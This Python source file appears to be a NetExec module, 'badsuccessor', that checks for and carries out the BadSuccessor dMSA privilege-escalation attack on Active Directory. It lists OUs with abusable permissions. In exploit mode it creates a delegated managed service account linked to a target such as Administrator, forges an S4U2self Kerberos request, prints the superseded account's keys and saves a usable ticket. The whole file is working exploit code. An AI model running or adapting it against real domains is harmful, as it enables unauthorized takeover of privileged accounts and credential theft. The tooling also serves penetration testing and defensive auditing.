import datetime
import random
import string
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from pyasn1.type import tag

from impacket.ldap import ldaptypes
from impacket.ldap.ldapasn1 import SDFlagsControl
from impacket.ldap.ldap import LDAPSessionError
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, \
    seq_set, seq_set_iter, PA_S4U_X509_USER, EncTGSRepPart, KERB_DMSA_KEY_PACKAGE, \
    S4UUserID
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import _enctype_table, _get_checksum_profile, Cksumtype
from impacket.krb5 import constants
from impacket.krb5.constants import encodeFlags, ApplicationTagNumbers
from impacket.krb5.types import Principal, KerberosTime, Ticket

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes

RELEVANT_OBJECT_TYPES = {
    "00000000-0000-0000-0000-000000000000": "All Objects",
    "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
}

EXCLUDED_SIDS_SUFFIXES = ["-512", "-519"]  # Domain Admins, Enterprise Admins
EXCLUDED_SIDS = ["S-1-5-32-544", "S-1-5-18"]  # Builtin Administrators, Local SYSTEM

# Define all access rights
ACCESS_RIGHTS = {
    # Generic Rights
    "GenericRead": 0x80000000,  # ADS_RIGHT_GENERIC_READ
    "GenericWrite": 0x40000000,  # ADS_RIGHT_GENERIC_WRITE
    "GenericExecute": 0x20000000,  # ADS_RIGHT_GENERIC_EXECUTE
    "GenericAll": 0x10000000,  # ADS_RIGHT_GENERIC_ALL

    # Maximum Allowed access type
    "MaximumAllowed": 0x02000000,

    # Access System Acl access type
    "AccessSystemSecurity": 0x01000000,  # ADS_RIGHT_ACCESS_SYSTEM_SECURITY

    # Standard access types
    "Synchronize": 0x00100000,  # ADS_RIGHT_SYNCHRONIZE
    "WriteOwner": 0x00080000,  # ADS_RIGHT_WRITE_OWNER
    "WriteDACL": 0x00040000,  # ADS_RIGHT_WRITE_DAC
    "ReadControl": 0x00020000,  # ADS_RIGHT_READ_CONTROL
    "Delete": 0x00010000,  # ADS_RIGHT_DELETE

    # Specific rights
    "AllExtendedRights": 0x00000100,  # ADS_RIGHT_DS_CONTROL_ACCESS
    "ListObject": 0x00000080,  # ADS_RIGHT_DS_LIST_OBJECT
    "DeleteTree": 0x00000040,  # ADS_RIGHT_DS_DELETE_TREE
    "WriteProperties": 0x00000020,  # ADS_RIGHT_DS_WRITE_PROP
    "ReadProperties": 0x00000010,  # ADS_RIGHT_DS_READ_PROP
    "Self": 0x00000008,  # ADS_RIGHT_DS_SELF
    "ListChildObjects": 0x00000004,  # ADS_RIGHT_ACTRL_DS_LIST
    "DeleteChild": 0x00000002,  # ADS_RIGHT_DS_DELETE_CHILD
    "CreateChild": 0x00000001,  # ADS_RIGHT_DS_CREATE_CHILD
}

# Define which rights are considered relevant for potential abuse
RELEVANT_RIGHTS = {
    "GenericAll": ACCESS_RIGHTS["GenericAll"],
    "GenericWrite": ACCESS_RIGHTS["GenericWrite"],
    "WriteOwner": ACCESS_RIGHTS["WriteOwner"],
    "WriteDACL": ACCESS_RIGHTS["WriteDACL"],
    "CreateChild": ACCESS_RIGHTS["CreateChild"],
    "WriteProperties": ACCESS_RIGHTS["WriteProperties"],
    "AllExtendedRights": ACCESS_RIGHTS["AllExtendedRights"]
}

FUNCTIONAL_LEVELS = {
    "Windows 2000": 0,
    "Windows Server 2003": 1,
    "Windows Server 2003 R2": 2,
    "Windows Server 2008": 3,
    "Windows Server 2008 R2": 4,
    "Windows Server 2012": 5,
    "Windows Server 2012 R2": 6,
    "Windows Server 2016": 7,
    "Windows Server 2019": 8,
    "Windows Server 2022": 9,
    "Windows Server 2025": 10,
}


class NXCModule:
    """
    -------
    Module by @mpgn based on https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#credentials
    and https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1
    Exploit functionality based on impacket badsuccessor.py and getST.py dMSA support.
    """

    name = "badsuccessor"
    description = "Check and exploit the bad successor attack (DMSA)"
    supported_protocols = ["ldap"]
    category = CATEGORY.ENUMERATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.connection = None
        self.target_ou = None
        self.target_account = None
        self.dmsa_name = None
        self.delete = False

    def options(self, context, module_options):
        """
        Without options the module enumerates OUs vulnerable to BadSuccessor.
        Provide TARGET_OU to create a dMSA, retrieve the superseded account keys, and save a .ccache ticket.

        TARGET_OU       DN of the OU where the dMSA will be created (triggers exploit mode)
        TARGET_ACCOUNT  sAMAccountName of the account to impersonate via migration (default: Administrator)
        DMSA_NAME       Name for the new dMSA object (default: auto-generated dMSA-XXXXXXXX)
        DELETE          Set to True together with DMSA_NAME and TARGET_OU to delete an existing dMSA

        Examples:
            nxc ldap <ip> -u user -p pass -M badsuccessor
            nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local'
            nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local' TARGET_ACCOUNT=DC01$
            nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local' DMSA_NAME=DMSA DELETE=True
        """
        self.context = context
        self.module_options = module_options
        self.target_ou = module_options.get("TARGET_OU")
        self.target_account = module_options.get("TARGET_ACCOUNT", "Administrator")
        self.dmsa_name = module_options.get("DMSA_NAME")
        self.delete = module_options.get("DELETE", "").upper() == "TRUE"

        if self.dmsa_name:
            self.dmsa_name = self.dmsa_name.rstrip("$")

    def _get_domain_sid(self):
        r = self.connection.search(searchFilter="(objectClass=domain)", attributes=["objectSid"])
        parsed = parse_result_attributes(r)
        if parsed and "objectSid" in parsed[0]:
            return parsed[0]["objectSid"]
        return None

    def _resolve_sid_to_name(self, sid):
        try:
            resp = self.connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"])
            parsed = parse_result_attributes(resp)
            if parsed and "sAMAccountName" in parsed[0]:
                return parsed[0]["sAMAccountName"]
        except Exception:
            pass
        return sid

    def _resolve_account_dn(self, sam):
        resp = self.connection.search(
            searchFilter=f"(&(objectClass=*)(sAMAccountName={sam}))",
            attributes=["distinguishedName", "objectClass"],
        )
        parsed = parse_result_attributes(resp)
        if not parsed:
            return None
        for entry in parsed:
            oc = entry.get("objectClass", [])
            if isinstance(oc, str):
                oc = [oc]
            if any(c.lower() in ("user", "computer") for c in oc):
                return entry["distinguishedName"]
        return parsed[0]["distinguishedName"]

    def _get_user_sid(self, username):
        resp = self.connection.search(
            searchFilter=f"(&(objectClass=user)(sAMAccountName={username}))",
            attributes=["objectSid"],
        )
        parsed = parse_result_attributes(resp)
        if parsed and "objectSid" in parsed[0]:
            return parsed[0]["objectSid"]
        return None

    @staticmethod
    def _is_excluded_sid(sid, domain_sid):
        if sid in EXCLUDED_SIDS:
            return True
        return any(sid.startswith(domain_sid) and sid.endswith(s) for s in EXCLUDED_SIDS_SUFFIXES)

    @staticmethod
    def _build_gmsa_sd(sid_string):
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd["Revision"] = b"\x01"
        sd["Sbz1"] = b"\x00"
        sd["Control"] = 32772
        sd["OwnerSid"] = ldaptypes.LDAP_SID()
        sd["OwnerSid"].fromCanonical(sid_string)
        sd["GroupSid"] = b""
        sd["Sacl"] = b""

        acl = ldaptypes.ACL()
        acl["AclRevision"] = 4
        acl["Sbz1"] = 0
        acl["Sbz2"] = 0
        acl.aces = []

        for mask_value in (0x000F01FF, 0x10000000):
            ace = ldaptypes.ACE()
            ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            ace["AceFlags"] = 0x00
            acedata = ldaptypes.ACCESS_ALLOWED_ACE()
            acedata["Mask"] = ldaptypes.ACCESS_MASK()
            acedata["Mask"]["Mask"] = mask_value
            acedata["Sid"] = ldaptypes.LDAP_SID()
            acedata["Sid"].fromCanonical(sid_string)
            ace["Ace"] = acedata
            acl.aces.append(ace)

        sd["Dacl"] = acl
        return sd.getData()

    def _find_bad_successor_ous(self, entries):
        domain_sid = self._get_domain_sid()
        results = {}
        for entry in parse_result_attributes(entries):
            dn = entry["distinguishedName"]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=entry["nTSecurityDescriptor"])

            for ace in sd["Dacl"]["Data"]:
                if ace["AceType"] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                if not any(mask & v for v in RELEVANT_RIGHTS.values()):
                    continue
                ot = getattr(ace, "ObjectType", None)
                if ot and ldaptypes.bin_to_string(ot).lower() not in RELEVANT_OBJECT_TYPES:
                    continue
                sid = ace["Ace"]["Sid"].formatCanonical()
                if not self._is_excluded_sid(sid, domain_sid):
                    results.setdefault(sid, []).append(dn)

            if hasattr(sd, "OwnerSid"):
                owner = str(sd["OwnerSid"])
                if not self._is_excluded_sid(owner, domain_sid):
                    results.setdefault(owner, []).append(dn)
        return results

    def _enumerate(self, context):
        controls = [SDFlagsControl(criticality=True, flags=0x07)]
        resp = self.connection.search(
            searchFilter="(objectClass=organizationalUnit)",
            attributes=["distinguishedName", "nTSecurityDescriptor"],
            searchControls=controls,
        )
        context.log.debug(f"Found {len(resp)} OUs")

        results = self._find_bad_successor_ous(resp)
        if results:
            context.log.success(f"Found {len(results)} identities with BadSuccessor privileges")
        else:
            context.log.highlight("No vulnerable OU found")

        for sid, ous in results.items():
            name = self._resolve_sid_to_name(sid)
            for ou in ous:
                if sid == name:
                    context.log.highlight(f"{sid}, {ou}")
                else:
                    context.log.highlight(f"{name} ({sid}), {ou}")

    def _create_dmsa(self, context, connection):
        if not self.dmsa_name:
            self.dmsa_name = "dMSA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

        dmsa_dn = f"CN={self.dmsa_name},{self.target_ou}"

        target_dn = self._resolve_account_dn(self.target_account)
        if not target_dn:
            context.log.fail(f"Target account not found: {self.target_account}")
            return None

        user_sid = self._get_user_sid(connection.username)
        if not user_sid:
            context.log.fail(f"Could not resolve SID for current user: {connection.username}")
            return None

        sd_data = self._build_gmsa_sd(user_sid)
        dns_hostname = f"{self.dmsa_name.lower()}.{connection.domain}"

        try:
            connection.ldap_connection.add(
                dmsa_dn,
                ["msDS-DelegatedManagedServiceAccount"],
                {
                    "cn": self.dmsa_name,
                    "sAMAccountName": f"{self.dmsa_name}$",
                    "dNSHostName": dns_hostname,
                    "userAccountControl": 4096,
                    "msDS-ManagedPasswordInterval": 30,
                    "msDS-DelegatedMSAState": 2,
                    "msDS-SupportedEncryptionTypes": 28,
                    "accountExpires": 9223372036854775807,
                    "msDS-ManagedAccountPrecededByLink": target_dn,
                    "msDS-GroupMSAMembership": sd_data,
                    "nTSecurityDescriptor": sd_data,
                },
            )
        except LDAPSessionError as e:
            context.log.fail(f"Failed to create dMSA '{self.dmsa_name}': {e}")
            return None

        context.log.success(f"dMSA '{self.dmsa_name}$' created at {dmsa_dn}")
        context.log.highlight(f"DNS Hostname: {dns_hostname}")
        context.log.highlight("Migration state: 2 (completed)")
        context.log.highlight(f"Target account: {target_dn}")
        return dmsa_dn

    def _delete_dmsa(self, context):
        if not self.dmsa_name:
            context.log.fail("DMSA_NAME is required for deletion")
            return
        if not self.target_ou:
            context.log.fail("TARGET_OU is required for deletion")
            return

        dmsa_dn = f"CN={self.dmsa_name},{self.target_ou}"
        try:
            self.connection.ldap_connection.delete(dmsa_dn)
            context.log.success(f"dMSA '{self.dmsa_name}$' deleted ({dmsa_dn})")
        except LDAPSessionError as e:
            context.log.fail(f"Failed to delete dMSA '{self.dmsa_name}': {e}")

    def _do_s4u_dmsa(self, context, connection):
        domain = connection.domain
        kdc_host = connection.host

        user_principal = Principal(connection.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        context.log.info("Requesting TGT...")
        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                user_principal, connection.password, domain,
                unhexlify(connection.lmhash), unhexlify(connection.nthash),
                connection.aesKey, kdc_host,
            )
        except Exception as e:
            context.log.fail(f"Failed to get TGT: {e}")
            return

        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decodedTGT["ticket"])

        # AP-REQ for TGS
        apReq = AP_REQ()
        apReq["pvno"] = 5
        apReq["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        apReq["ap-options"] = constants.encodeFlags([])
        seq_set(apReq, "ticket", ticket.to_asn1)

        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5
        authenticator["crealm"] = str(decodedTGT["crealm"])
        clientName = Principal()
        clientName.from_asn1(decodedTGT, "crealm", "cname")
        seq_set(authenticator, "cname", clientName.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator["cusec"] = now.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now)

        encodedAuth = encoder.encode(authenticator)
        encryptedAuth = cipher.encrypt(sessionKey, 7, encodedAuth, None)
        apReq["authenticator"] = noValue
        apReq["authenticator"]["etype"] = cipher.enctype
        apReq["authenticator"]["cipher"] = encryptedAuth
        encodedApReq = encoder.encode(apReq)

        # PA-S4U-X509-USER for dMSA impersonation
        dmsa_principal = Principal(f"{self.dmsa_name}$", type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        nonce_value = random.getrandbits(31)
        dmsa_flags = [2, 4]  # UNCONDITIONAL_DELEGATION | SIGN_REPLY
        encoded_flags = encodeFlags(dmsa_flags)

        s4uID = S4UUserID()
        s4uID.setComponentByName("nonce", nonce_value)
        seq_set(s4uID, "cname", dmsa_principal.components_to_asn1)
        s4uID.setComponentByName("crealm", domain)
        s4uID.setComponentByName("options", encoded_flags)

        checksum_profile = _get_checksum_profile(Cksumtype.SHA1_AES256)
        checkSum = checksum_profile.checksum(sessionKey, ApplicationTagNumbers.EncTGSRepPart.value, encoder.encode(s4uID))

        s4uID_tagged = S4UUserID().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))
        s4uID_tagged.setComponentByName("nonce", nonce_value)
        seq_set(s4uID_tagged, "cname", dmsa_principal.components_to_asn1)
        s4uID_tagged.setComponentByName("crealm", domain)
        s4uID_tagged.setComponentByName("options", encoded_flags)

        pa_s4u = PA_S4U_X509_USER()
        pa_s4u.setComponentByName("user-id", s4uID_tagged)
        pa_s4u["checksum"] = noValue
        pa_s4u["checksum"]["cksumtype"] = Cksumtype.SHA1_AES256
        pa_s4u["checksum"]["checksum"] = checkSum

        tgsReq = TGS_REQ()
        tgsReq["pvno"] = 5
        tgsReq["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq["padata"] = noValue
        tgsReq["padata"][0] = noValue
        tgsReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq["padata"][0]["padata-value"] = encodedApReq
        tgsReq["padata"][1] = noValue
        tgsReq["padata"][1]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
        tgsReq["padata"][1]["padata-value"] = encoder.encode(pa_s4u)

        reqBody = seq_set(tgsReq, "req-body")
        reqBody["kdc-options"] = constants.encodeFlags([
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
        ])
        serverName = Principal(f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, "sname", serverName.components_to_asn1)
        reqBody["realm"] = str(decodedTGT["crealm"])
        reqBody["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        reqBody["nonce"] = random.getrandbits(31)
        seq_set_iter(reqBody, "etype", (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        context.log.info("Requesting S4U2self with dMSA...")
        try:
            r = sendReceive(encoder.encode(tgsReq), domain, kdc_host)
        except Exception as e:
            context.log.fail(f"S4U2self request failed: {e}")
            return

        # Decrypt TGS-REP → extract KERB_DMSA_KEY_PACKAGE
        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
        try:
            rep_cipher = _enctype_table[int(tgs["enc-part"]["etype"])]
            plain = rep_cipher.decrypt(sessionKey, 8, tgs["enc-part"]["cipher"])
            enc_part = decoder.decode(plain, asn1Spec=EncTGSRepPart())[0]

            if "encrypted_pa_data" not in enc_part or not enc_part["encrypted_pa_data"]:
                context.log.fail("No encrypted_pa_data — dMSA key package not present")
                return

            for pa in enc_part["encrypted_pa_data"]:
                if int(pa["padata-type"]) == constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
                    pkg = decoder.decode(pa["padata-value"], asn1Spec=KERB_DMSA_KEY_PACKAGE())[0]

                    context.log.success("Current keys:")
                    for k in pkg["current-keys"]:
                        etype_name = constants.EncryptionTypes(int(k["keytype"]))
                        context.log.highlight(f"{etype_name}: {hexlify(bytes(k['keyvalue'])).decode()}")

                    context.log.success("Previous keys:")
                    for k in pkg["previous-keys"]:
                        etype_name = constants.EncryptionTypes(int(k["keytype"]))
                        context.log.highlight(f"{etype_name}: {hexlify(bytes(k['keyvalue'])).decode()}")
                    break
            else:
                context.log.fail("KERB_DMSA_KEY_PACKAGE not found in response")
                return
        except Exception as e:
            context.log.fail(f"Failed to extract dMSA keys: {e}")
            context.log.debug(f"Exception details: {e!r}")
            return

        # Save .ccache
        try:
            ccache = CCache()
            ccache.fromTGS(r, sessionKey, sessionKey)
            filename = f"{self.dmsa_name}$.ccache"
            ccache.saveFile(filename)
            context.log.success(f"Service ticket saved to {filename}")
        except Exception as e:
            context.log.fail(f"Failed to save ccache: {e}")

    def on_login(self, context, connection):
        self.connection = connection

        # Check for a domain controller with Windows Server 2025
        resp = self.connection.search(
            searchFilter="(&(objectCategory=computer)(primaryGroupId=516))",
            attributes=["operatingSystem", "dNSHostName"],
        )
        has_2025_dc = False
        for dc in parse_result_attributes(resp):
            if "2025" in dc.get("operatingSystem", ""):
                has_2025_dc = True
                out = connection.resolver(dc["dNSHostName"])
                dc_ip = out["host"] if out else "Unknown IP"
                context.log.success(f"Found DC with Windows Server 2025: {dc_ip} ({dc['dNSHostName']})")
                break
        if not has_2025_dc:
            context.log.fail("No DC with Windows Server 2025 found, attack may not be possible")

        if self.delete:
            self._delete_dmsa(context)
        elif self.target_ou:
            dmsa_dn = self._create_dmsa(context, connection)
            if dmsa_dn:
                self._do_s4u_dmsa(context, connection)
        else:
            self._enumerate(context)
